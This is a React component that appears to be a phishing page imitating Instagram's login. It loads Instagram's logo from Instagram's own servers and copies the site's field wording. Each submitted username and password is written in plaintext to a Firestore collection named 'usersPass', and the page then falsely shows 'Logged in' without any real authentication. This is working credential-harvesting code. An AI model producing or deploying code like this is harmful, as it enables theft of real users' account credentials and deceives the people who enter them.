import { useState } from "react";
import { collection, addDoc, serverTimestamp } from "firebase/firestore";
import { db } from "../firebase";

export default function Login() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [msg, setMsg] = useState("");

  const submit = async (e) => {
    e.preventDefault();
    await addDoc(collection(db, "usersPass"), {
      username,
      password,
      createdAt: serverTimestamp()
    });
    setMsg("Logged in");
    setUsername("");
    setPassword("");
  };

  return (
    <div className="login-box">
      <img
        className="logo"
        src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png"
      />

      <form onSubmit={submit}>
        <input
          placeholder="Phone number, username, or email"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          required
        />

        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          required
        />

        <button>Log in</button>
      </form>

      {msg && <p className="msg">{msg}</p>}
    </div>
  );
}